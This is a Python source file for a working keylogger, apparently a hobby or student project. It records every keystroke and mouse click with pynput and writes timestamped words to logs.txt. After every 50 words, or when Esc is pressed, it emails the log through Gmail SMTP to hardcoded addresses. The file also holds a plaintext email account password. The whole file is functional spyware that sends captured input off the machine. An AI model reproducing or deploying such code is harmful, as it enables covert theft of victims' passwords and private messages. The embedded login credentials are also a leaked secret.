import time
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

word = []
word_count = 0

sender = "keylogproject38@gmail.com"
sender_pass = "gottaloveloggingthemkeys"

email_receivers = ["keylogproject38@gmail.com", "arianibobi@gmail.com"]


def on_click(x, y, button, pressed):
    if pressed is None:
        print("pressed is none")
        return False
    global word
    write_word()
    word = []


def email_logs():
    mail = MIMEMultipart()

    mail['From'] = sender
    mail['Subject'] = "Key Logs"

    log_file = open("logs.txt", "rb")
    attachment = MIMEBase('application', 'octet-stream')
    attachment.set_payload(log_file.read())
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', 'attachment; filename= logs.txt')
    mail.attach(attachment)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(sender, sender_pass)

    for receiver in email_receivers:
        mail['To'] = receiver
        s.sendmail(sender, receiver, mail.as_string())
    s.quit()
    return


def on_press(key):
    global word

    if str(key) == 'Key.space' or str(key) == 'Key.enter':
        if len(word) > 0:
            write_word()
            word = []
    elif str(key) == 'Key.backspace':
        if len(word) > 0:
            word.pop(len(word) - 1)
    else:
        word.append(key)


def write_word():
    global word_count

    if len(word) == 0:
        return

    cur_time = time.localtime()
    time_str = time.asctime(cur_time)
    with open("logs.txt", "a") as f:
        f.write(time_str + ": ")
        for letter in word:
            l = str(letter).replace("'", "")

            f.write(str(l))
        f.write('\n')

    word_count += 1
    if word_count >= 50:
        email_logs()
        clear_logs()
        word_count = 0


def on_release(key):
    if str(key) == 'Key.esc':
        email_logs()
        with open("logs.txt", "w") as f:
            f.truncate()
            f.close()
        mouse_listener.stop()
        return False


def clear_logs():
    with open("logs.txt", "w") as file:
        file.truncate()
        file.close()


with MouseListener(on_click=on_click) as mouse_listener:
    with KeyboardListener(on_press=on_press, on_release=on_release) as keyboard_listener:
        mouse_listener.join()
        keyboard_listener.join()

